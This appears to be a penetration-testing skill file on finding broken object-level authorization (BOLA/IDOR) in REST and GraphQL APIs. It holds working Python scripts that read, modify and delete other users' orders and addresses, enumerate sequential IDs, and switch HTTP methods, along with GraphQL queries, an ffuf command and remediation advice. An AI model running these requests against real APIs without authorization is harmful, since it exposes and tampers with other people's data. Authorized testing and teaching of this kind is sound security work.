---
name: testing-api-for-broken-object-level-authorization
description: Tests REST and GraphQL APIs for BOLA/IDOR — where authenticated users access or modify resources belonging to other users by manipulating object identifiers. Covers OWASP API1:2023 across all HTTP methods, ID formats, batch endpoints, and GraphQL.
domain: cybersecurity
subdomain: api-security
tags:
- api-security
- owasp
- bola
- idor
- authorization
version: 1.0.0
---
# Testing API for Broken Object Level Authorization

## When to Use

- Assessing REST or GraphQL APIs that use object identifiers in URL paths, query params, or request bodies
- Performing OWASP API Top 10 assessments targeting API1:2023 (BOLA)
- Testing multi-tenant SaaS applications for cross-tenant data leakage
- Validating per-object authorization enforcement beyond authentication
- Regression-checking authorization after adding new endpoints

**Do not use** without written authorization. BOLA testing requires accessing or attempting to access other users' data.

## Prerequisites

- Written authorization covering target endpoints and scope
- At least two test accounts with separate data sets (different user IDs and owned objects)
- Burp Suite Professional + Autorize extension
- Authentication tokens for each account (JWT, cookies, or API keys)
- OpenAPI/Swagger spec, or Burp sitemap from proxying the application
- Python 3.10+ with `requests`

## Workflow

### Step 1: Map All Object-Bearing Endpoints

```bash
# Extract path-parameterized endpoints from OpenAPI spec
curl -s https://target-api.example.com/api/docs/swagger.json | python3 -c "
import json, sys
spec = json.load(sys.stdin)
for path, methods in spec.get('paths', {}).items():
    for method in ('get','post','put','patch','delete'):
        if method in methods:
            params = [p['name'] for p in methods[method].get('parameters',[])
                      if p.get('in') in ('path','query')]
            if params:
                print(f'{method.upper():6} {path}  params={params}')
"
```

**ID type risk classification:**

| ID Type | Example | Predictability | BOLA Risk |
|---------|---------|---------------|-----------|
| Sequential integer | `/orders/1042` | High — enumerate by ±1 | Critical |
| UUID v4 | `/orders/550e8400-…` | Low — random | Medium (if leaked in responses) |
| Base64 / encoded | `/orders/NTAwMw==` | High — decode + predict | High |
| Composite | `/users/42/orders/1042` | High — swap either part | Critical |
| Slug | `/profiles/john-doe` | Medium — guess usernames | High |

### Step 2: Establish Baseline for Both Accounts

```python
import requests

BASE_URL = "https://target-api.example.com/api/v1"
hdrs_a = {"Authorization": "Bearer <user_a_token>", "Content-Type": "application/json"}
hdrs_b = {"Authorization": "Bearer <user_b_token>", "Content-Type": "application/json"}

# Get each user's own data
user_a_id = requests.get(f"{BASE_URL}/users/me", headers=hdrs_a).json()["id"]
user_b_id = requests.get(f"{BASE_URL}/users/me", headers=hdrs_b).json()["id"]

orders_a = [o["id"] for o in requests.get(f"{BASE_URL}/users/{user_a_id}/orders", headers=hdrs_a).json()["orders"]]
orders_b = [o["id"] for o in requests.get(f"{BASE_URL}/users/{user_b_id}/orders", headers=hdrs_b).json()["orders"]]

print(f"User A ({user_a_id}): owns orders {orders_a}")
print(f"User B ({user_b_id}): owns orders {orders_b}")
```

### Step 3: Core BOLA Tests — Read, Write, Delete

```python
results = []

def check(label, endpoint, method="GET", json_body=None):
    r = requests.request(method, f"{BASE_URL}{endpoint}", headers=hdrs_a, json=json_body)
    vuln = r.status_code not in (401, 403, 404)
    results.append({"test": label, "status": r.status_code, "vulnerable": vuln})
    print(f"[{'VULN' if vuln else 'OK':4}] {method} {endpoint} -> {r.status_code}")
    return r

# Read another user's objects
check("Read other user profile",    f"/users/{user_b_id}")
check("Read other user order",      f"/orders/{orders_b[0]}")
check("Read other user invoice",    f"/users/{user_b_id}/orders/{orders_b[0]}/invoice")

# Write / modify another user's objects
check("Modify other user order",    f"/orders/{orders_b[0]}", "PATCH", {"status": "cancelled"})
check("Modify other user address",  f"/users/{user_b_id}/address", "PUT",
      {"street": "1 Attacker Ln", "city": "Hacktown"})

# Delete another user's object
check("Delete other user order",    f"/orders/{orders_b[0]}", "DELETE")
```

### Step 4: Advanced BOLA Patterns

```python
# Pattern 1 — Parameter pollution (two IDs in same request)
r = requests.get(f"{BASE_URL}/orders/{orders_a[0]}?order_id={orders_b[0]}", headers=hdrs_a)
print(f"Parameter pollution: {r.status_code}")

# Pattern 2 — Batch / bulk endpoint includes foreign IDs
r = requests.post(f"{BASE_URL}/orders/batch", headers=hdrs_a,
    json={"order_ids": orders_a + orders_b})
returned = len(r.json().get("orders", []))
print(f"Batch inclusion: {r.status_code}, returned {returned} orders (expected ≤{len(orders_a)})")

# Pattern 3 — Sequential ID enumeration (±5 from own IDs)
for offset in range(-5, 6):
    test_id = orders_a[0] + offset
    if test_id in orders_a:
        continue
    r = requests.get(f"{BASE_URL}/orders/{test_id}", headers=hdrs_a)
    if r.status_code == 200:
        owner = r.json().get("user_id", "?")
        if str(owner) != str(user_a_id):
            print(f"[BOLA] Order {test_id} owned by {owner}, accessible via User A")

# Pattern 4 — HTTP method switching (if GET is blocked, try PUT)
for method in ['GET','PUT','PATCH','DELETE','HEAD']:
    r = requests.request(method, f"{BASE_URL}/users/{user_b_id}/settings",
        headers=hdrs_a, json={"notifications": False})
    if r.status_code not in (401, 403, 404, 405):
        print(f"[BOLA] Method {method} on other user settings: {r.status_code}")

# Pattern 5 — JSON body ID override
r = requests.post(f"{BASE_URL}/orders/details", headers=hdrs_a,
    json={"order_id": orders_b[0]})
print(f"Body ID override: {r.status_code}")
```

### Step 5: Automated Detection with Burp Autorize

1. Install **Autorize** from the Burp BApp Store
2. Paste User B's `Authorization` header into the Autorize tab
3. Set interception filters — include: `.*\/api\/.*` ; exclude: `.*\.(js|css|png)$`
4. Set enforcement detector: flag as "bypassed" if User A gets HTTP 200 on User B's resources
5. Browse the app as User A — Autorize replays every request with User B's token automatically
6. Review results table:
   - **Green** = authorization enforced
   - **Red** = authorization bypassed (BOLA)
   - **Orange** = manual review needed

### Step 6: GraphQL BOLA

```graphql
# Relay node ID — Base64("Order:5003") = User B's order
query {
  node(id: "T3JkZXI6NTAwMw==") {
    ... on Order {
      id
      totalAmount
      shippingAddress { street city }
      items { productName quantity }
    }
  }
}

# Nested relationship traversal — access User B's payment data
query {
  user(id: "1002") {
    email
    orders {
      edges {
        node {
          totalAmount
          paymentMethod { lastFourDigits }
        }
      }
    }
  }
}
```

## Key Concepts

| Term | Definition |
|------|------------|
| **BOLA** | Broken Object Level Authorization (OWASP API1:2023) — server authenticates user but does not verify they own the requested object |
| **IDOR** | Insecure Direct Object Reference — user-controlled input accesses objects directly without authorization check |
| **Horizontal escalation** | Accessing another user's resources at the same privilege level |
| **Vertical escalation** | Reaching resources or operations restricted to a higher privilege level |
| **Autorize** | Burp Suite extension automating BOLA detection by replaying requests with alternate user tokens |

## Tools

- **Burp Suite Professional** — proxy and Autorize extension for automated multi-user replay
- **OWASP ZAP** — open-source alternative with Access Control Testing add-on
- **Postman** — manual multi-token request replay across collections
- **ffuf** — enumerate object IDs at scale: `ffuf -u https://api/orders/FUZZ -w ids.txt -H "Authorization: Bearer ..."`

## Output Format

```
## Finding: BOLA — Order and Address APIs

**ID**: API-BOLA-001  |  Severity: High (CVSS 7.5)
**OWASP API**: API1:2023 — Broken Object Level Authorization

**Affected Endpoints**:
  GET  /api/v1/orders/{id}
  PATCH /api/v1/addresses/{id}
  GET  /api/v1/users/{id}/payment-methods
  POST /api/v1/orders/batch

**Proof of Concept**:
1. Authenticate as User A (ID 1001)
2. GET /api/v1/orders/5003  →  200 OK (User B's order returned in full)
3. PATCH /api/v1/addresses/2002  →  200 OK (User B's address modified)

**Impact**: Read access to all customer orders; write access to any delivery
address; partial payment card exposure.

**Remediation**:
1. Add ownership check at data-access layer: WHERE order.user_id = auth_user.id
2. Apply the same check to every HTTP method and every nested resource path
3. Add authorization assertions to CI/CD for every endpoint accepting object IDs
```
